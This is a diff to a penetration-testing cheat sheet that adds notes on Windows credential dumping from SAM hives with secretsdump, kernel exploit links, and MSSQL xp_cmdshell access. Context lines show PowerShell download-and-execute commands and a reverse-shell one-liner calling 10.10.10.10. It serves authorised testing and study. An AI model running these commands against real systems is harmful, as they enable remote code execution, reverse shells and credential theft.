@@ -105,6 +105,10 @@ Check for common vulnerabilities or misconfigurations :
 nikto -host http://$HOST
 ```
 
+- [Wappalyzer](https://www.wappalyzer.com/)  
+
+Browser add-on which finds website technologies.  
+
 ### 88 & 464 - Kerberos
 
 - AS-REP roasting with Impacket - GetNPUsers.py  
@@ -416,7 +420,7 @@ Example :
 
 - Hashcat  
 
-I tend to prefer John over hashcat since it's (imho) easier to use but I should definitely look more into it.
+I tend to prefer John over hashcat since it's (imho) easier to use, but for faster results or mass cracking Hashcat is way better since it uses the GPU.  
 ```
 hashcat -m $HASH-TYPE -a $MODE $HASH $WORDLIST
 ```
@@ -525,11 +529,11 @@ find /usr/bin/ -perm -4000
 #### Tools  
 
 Powershell :  
-[JAWS](https://github.com/411Hall/JAWS)  
 [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/dev)  
 with [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)  
 and [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)  
 [Sherlock](https://github.com/rasta-mouse/Sherlock)  
+[JAWS](https://github.com/411Hall/JAWS)  
 [SessionGopher](https://github.com/Arvanaghi/SessionGopher)  
 
 Executables :  
@@ -627,6 +631,13 @@ reg query HKLM /F "password" /t REG_SZ /S /K
 
 # query specific
 reg query "HKLM\SOFTWARE\Microsoft\...."
+
+# if you have access or have a backup of the c:\, SAM files are located in
+c:\windows\system32\config\SAM
+c:\windows\system32\config\SECURITY
+c:\windows\system32\config\SYSTEM
+# then use secretsdump.py from impacket
+secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
 ```
 
 Others :  
@@ -751,7 +762,10 @@ Instead of malicious executables crafted with msfvenom, you can make custom batc
 
 ### CVEs
 
-[2019-1388](https://github.com/jas502n/CVE-2019-1388)  
+[CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)  
+
+[MS10-059](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059)  
+[MS16-014](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-014)  
 
 ## Get shells
 
@@ -823,6 +837,8 @@ certutil.exe -urlcache -split -f http://$HOST/$FILE $OUTPUT_FILE
 echo IEX(New-Object Net.WebClient).DownloadString('http://$HOST/$FILE') | powershell -noprofile -
 ```
 
+More [here](https://book.hacktricks.xyz/windows/basic-powershell-for-pentesters).  
+
 - smbserver  
 
 See [Hosting files on Kali](#hosting-files-on-kali)  
@@ -847,11 +863,6 @@ copy \\$IP\share\$FILE .
 
 ```
 powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 1337
-```
-
-Bypass execution policy :  
-```
-powershell -ep bypass
 ```
 
 ### Reverse shells from code execution on Linux
@@ -992,6 +1003,15 @@ winexe -U $USER%$PASS //$IP "cmd.exe"
 ```
 xfreerdp /u:$USER /v:$IP:$PORT
 ```
+
+- [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)  
+
+You can connect with creds like this :  
+```
+mssqlclient.py $DOMAIN/$USER:'$PASS'@$IP -windows-auth
+```
+
+And then try to get a shell with `enable_xp_cmdshell` and `xp_cmdshell whoami`, or use [this exploit](https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478). More [here](https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server).  
 
 ### Other tools  
 
